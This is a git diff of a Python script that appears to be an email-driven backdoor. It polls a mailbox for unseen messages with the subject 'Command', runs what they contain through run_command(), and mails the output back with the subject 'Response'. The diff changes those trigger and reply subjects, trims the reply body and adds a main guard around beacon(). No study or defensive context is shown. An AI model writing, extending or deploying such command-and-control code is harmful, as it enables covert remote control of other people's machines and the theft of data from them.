@@ -24,7 +24,7 @@ def beacon():
 
 def check_for_commands():
     #messages is a list of message ids (relative) that have "TestSubject" in the subject
-    status, messages = mail.search(None, '(UNSEEN SUBJECT "TestSubject")')
+    status, messages = mail.search(None, '(UNSEEN SUBJECT "Command")')
     for num in messages[0].split():
         #(RFC882) says to fetch the full raw contents of that email, using RFC 882 standard
         status, data = mail.fetch(num, '(RFC822)')
@@ -51,9 +51,8 @@ def run_command(command):
     send_response(command, output)
 
 def send_response(command, output):
-    body = f"Command: {command}\n\nOutput:\n{output}"
-    msg = MIMEText(body)
-    msg['Subject'] = 'ResponseSubject'
+    msg = MIMEText(output)
+    msg['Subject'] = 'Response'
     msg['From'] = EMAIL
     msg['To'] = EMAIL
 
@@ -62,4 +61,5 @@ def send_response(command, output):
     smtp.sendmail(EMAIL, EMAIL, msg.as_string())
     smtp.quit()
 
-beacon()
+if '__main__' == __name__:
+    beacon()
